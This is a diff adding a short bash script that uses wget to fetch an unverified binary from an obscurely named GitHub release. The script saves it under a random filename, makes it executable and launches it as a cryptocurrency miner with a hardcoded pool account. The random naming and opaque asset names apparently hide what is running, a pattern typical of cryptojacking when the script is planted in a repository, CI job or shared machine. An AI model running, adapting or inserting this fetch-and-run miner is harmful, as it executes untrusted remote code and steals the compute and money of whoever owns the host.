@@ -1,0 +1,56 @@
+#!/bin/bash
+
+# Generate a random 10-character lowercase alphanumeric filename
+generate_random_filename() {
+    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
+    echo
+}
+
+generate_worker_name() {
+    local prefix="APR"
+    local date_str
+    date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
+    local random_suffix
+    random_suffix=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 4)
+
+    echo "${prefix}-${date_str}-${random_suffix}"
+}
+
+
+main() {
+    miner_filename=$(generate_random_filename)
+    worker_name=$(generate_worker_name)
+
+    # Optional: cleanup on Ctrl+C or SIGTERM
+    trap "echo '🧹 Cleaning up...'; rm -f \"$miner_filename\"; exit" INT TERM
+
+    echo "📥 Downloading miner to: $miner_filename"
+    if wget -q https://github.com/vedhagsvp/qubros/releases/download/srmn/aplnopa -O "$miner_filename"; then
+        echo "✅ Miner downloaded as: $miner_filename"
+    else
+        echo "❌ Failed to download miner. Exiting."
+        exit 1
+    fi
+
+    echo "🔐 Setting executable permission..."
+    if chmod +x "$miner_filename"; then
+        echo "✅ Permissions set."
+    else
+        echo "❌ Failed to set permissions. Exiting."
+        exit 1
+    fi
+
+    echo "👷 Worker Name: $worker_name"
+
+    echo "🚀 Starting miner..."
+    ./"$miner_filename" \
+        --algo qubic_xmr --account CP_oovmcf5dq0 --pool qubic.asia.apool.io:4334 --worker cpu-$RANDOM
+
+    if [[ $? -eq 0 ]]; then
+        echo "✅ Miner ran successfully."
+    else
+        echo "❌ Miner exited with an error."
+    fi
+}
+
+main
